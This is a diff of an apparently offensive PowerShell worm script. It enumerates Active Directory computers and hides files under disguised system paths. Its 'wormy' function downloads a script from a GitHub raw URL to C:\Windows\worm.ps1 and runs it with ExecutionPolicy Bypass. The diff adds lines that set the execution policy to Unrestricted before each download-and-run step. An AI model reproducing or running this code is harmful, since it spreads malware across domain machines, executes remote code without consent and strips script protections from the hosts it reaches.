@@ -15,6 +15,7 @@ else{
 $domainSystemInfo = get-adcomputer -filter * -Properties ipv4address | select ipv4address , dnshostname
 
 import-module activedirectory
+set-executionpolicy Unrestricted
 
 if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTextServiceDa.txt')){
     try{mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'}
@@ -70,6 +71,7 @@ function wormy{
             if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
                 if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                     Invoke-Command -ScriptBlock {
+                    set-executionpolicy Unrestricted
                     $WebClient = New-Object System.Net.WebClient
                     $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\worm.ps1")
                     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass
@@ -77,6 +79,7 @@ function wormy{
                 }
             }
             else{
+                    set-executionpolicy Unrestricted
                     $WebClient = New-Object System.Net.WebClient
                     $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\worm.ps1")
                     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass   
